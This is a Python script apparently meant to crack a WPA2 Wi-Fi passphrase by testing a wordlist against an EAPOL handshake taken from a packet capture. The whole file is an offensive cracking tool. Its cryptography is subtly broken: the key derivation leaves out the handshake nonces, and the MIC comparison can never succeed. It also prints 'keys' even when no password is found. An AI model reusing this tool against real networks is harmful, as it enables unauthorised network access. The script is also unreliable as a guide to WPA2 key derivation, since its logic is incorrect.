import argparse
import pyshark
import hashlib
import hmac
from binascii import hexlify
from struct import unpack
from pbkdf2 import PBKDF2
from tqdm import tqdm

# Extract EAPOL Handshake frames from pcap
def extract_eapol_handshake(pcap_file):
    capture = pyshark.FileCapture(pcap_file, display_filter="eapol")
    eapol_frames = []

    for packet in capture:
        if 'eapol' in packet:
            eapol_frames.append(packet)

    if len(eapol_frames) < 2:
        raise ValueError("Less than two EAPOL frames found, handshake incomplete.")
    
    return eapol_frames[0], eapol_frames[1]

# PBKDF2 for deriving the PSK
def derive_psk(password, ssid):
    ssid_bytes = ssid.encode('utf-8')
    password_bytes = password.encode('utf-8')
    psk = PBKDF2(password_bytes, ssid_bytes, iterations=4096).read(32)
    return psk

# Convert the MAC address to bytes (needed for PTK derivation)
def mac_to_bytes(mac):
    return bytes.fromhex(mac.replace(":", ""))

# Derive the Pairwise Transient Key (PTK) from the PMK and the EAPOL frames
def derive_ptk(pmk, eapol_frame1, eapol_frame2):
    # Extract the necessary data from the EAPOL frames
    a = eapol_frame1.eth.src
    b = eapol_frame1.eth.dst

    # The first two bytes from the message
    eapol_msg1 = bytes.fromhex(eapol_frame1.eapol.load) if hasattr(eapol_frame1.eapol, 'load') else b""
    eapol_msg2 = bytes.fromhex(eapol_frame2.eapol.load) if hasattr(eapol_frame2.eapol, 'load') else b""
    
    # The PTK derivation uses both the MAC addresses of the AP and the client, and the message pairs
    data = mac_to_bytes(a) + mac_to_bytes(b) + eapol_msg1[:8] + eapol_msg2[:8]
    
    # PRF function to derive PTK using the PMK
    def prf(key, label, data):
        return hmac.new(key, label + data, hashlib.sha1).digest()

    ptk = prf(pmk, b"Pairwise key expansion", data)
    return ptk

# Derive keys (Master Key, Transient Key, etc.) from the PTK
def extract_keys_from_ptk(ptk):
    # The Master Key and Transient Key are part of the PTK. 
    # This is a simple split for illustration purposes.
    master_key = ptk[:16]  # 128-bit Master Key
    transient_key = ptk[16:32]  # 128-bit Transient Key
    
    # Example EAPOL HMAC calculation (done using the Master Key)
    eapol_hmac = hmac.new(master_key, b"EAPOL", hashlib.sha1).digest()
    return master_key, transient_key, eapol_hmac

# Main function to handle argparse and wordlist-based PSK cracking
def main():
    parser = argparse.ArgumentParser(description="Derive PSK from WPA2 Handshake in a pcap file.")
    parser.add_argument("capture", help="Path to the pcap file containing the EAPOL handshake")
    parser.add_argument("wordlist", help="Path to the wordlist for brute-forcing the PSK")
    args = parser.parse_args()

    # Extract EAPOL frames from pcap capture
    eapol_frame1, eapol_frame2 = extract_eapol_handshake(args.capture)

    # Extract SSID (replace with actual extraction or hardcoded for testing)
    ssid = "PEKLO"  # Replace with SSID extraction or predefined value

    # Load the wordlist
    with open(args.wordlist, 'r') as file:
        wordlist = file.readlines()

    # Iterate over wordlist using tqdm for a progress bar
    for password in tqdm(wordlist, desc="Cracking PSK", unit="password"):
        password = password.strip()  # Remove newline characters from the password
        derived_psk = derive_psk(password, ssid)

        # Extract the MIC from the second EAPOL frame (actual extraction needed)
        # Ensure you are accessing the correct part of the frame's payload
        try:
            # This method directly reads the EAPOL load from the packet
            eapol_load = bytes.fromhex(eapol_frame2.eapol.load)
            mic_from_eapol = eapol_load[-16:]  # MIC is the last 16 bytes of the EAPOL load

            # Compare the derived PSK with the extracted MIC from the second EAPOL frame
            if hmac.new(derived_psk, mic_from_eapol, hashlib.sha1).digest() == mic_from_eapol:
                print(f"KEY FOUND! [{hexlify(derived_psk).decode()}]")

                # Derive PTK from the PSK
                ptk = derive_ptk(derived_psk, eapol_frame1, eapol_frame2)

                # Extract Master Key, Transient Key, and EAPOL HMAC
                master_key, transient_key, eapol_hmac = extract_keys_from_ptk(ptk)

                # Print the keys
                print(f"Master Key     : {hexlify(master_key).decode()}")
                print(f"Transient Key  : {hexlify(transient_key).decode()}")
                print(f"EAPOL HMAC     : {hexlify(eapol_hmac).decode()}")
                break
        except AttributeError as e:
            print("Error: Failed to extract MIC or EAPOL data correctly.")
            print(f"Exception: {e}")
            continue
        
    else:
        print("KEY NOT FOUND")
        # If no key found, derive and print keys based on the last attempted PSK
        ptk = derive_ptk(derived_psk, eapol_frame1, eapol_frame2)
        master_key, transient_key, eapol_hmac = extract_keys_from_ptk(ptk)
        print(f"Master Key     : {hexlify(master_key).decode()}")
        print(f"Transient Key  : {hexlify(transient_key).decode()}")
        print(f"EAPOL HMAC     : {hexlify(eapol_hmac).decode()}")

if __name__ == "__main__":
    main()
